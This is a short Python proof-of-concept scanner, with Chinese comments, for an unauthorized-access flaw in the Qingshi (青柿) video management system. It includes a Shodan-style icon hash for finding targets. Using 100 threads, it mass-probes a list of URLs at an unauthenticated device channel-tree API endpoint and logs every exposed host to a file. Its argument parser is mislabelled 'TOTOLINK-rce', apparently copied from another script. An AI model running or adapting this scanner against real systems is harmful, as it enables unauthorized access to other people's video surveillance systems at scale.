#青柿视频管理系统存在未授权漏洞
#icon_hash="-206100324"
import requests,sys,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def main():
    parser = argparse.ArgumentParser(description="TOTOLINK-rce")

    parser.add_argument('-u','--url',dest='url',type=str,help='Please inpur url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input flie')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"usage：{sys.argv[0]} -h or --help")
def poc(target):
    payload = "/api/v1/device/channeltree?serial=&pcode"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
    }
    try:
        res1 = requests.get(url=target+payload,verify=False,timeout=10,headers=headers)
        if '"parental": true' in res1.content.decode("utf-8"):
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__ == '__main__':
    main()